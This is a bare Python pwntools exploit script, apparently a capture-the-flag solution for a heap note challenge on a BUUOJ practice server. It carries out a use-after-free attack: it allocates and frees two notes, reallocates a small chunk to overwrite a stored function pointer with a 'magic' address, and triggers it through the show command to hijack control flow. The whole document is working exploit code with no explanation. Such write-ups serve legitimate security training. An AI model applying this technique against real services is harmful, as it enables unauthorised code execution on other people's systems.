from pwn import *

io=remote('node3.buuoj.cn',26635)
magic=0x8048945

def add(size,data):
    io.sendline('1')
    io.recvuntil('Note size :')
    io.send(str(size))
    io.recvuntil('Content :')
    io.send(data)

def free(idx):
    io.sendline('2')
    io.recvuntil('Index :')
    io.send(str(idx))

def show(idx):
    io.sendline('3')
    io.recvuntil('Index :')
    io.send(str(idx))

add(16,'a'*16)#0
add(16,'b'*16)#1
free(0)
free(1)
add(8,p32(magic)+'bbbb')
show(0)

io.interactive()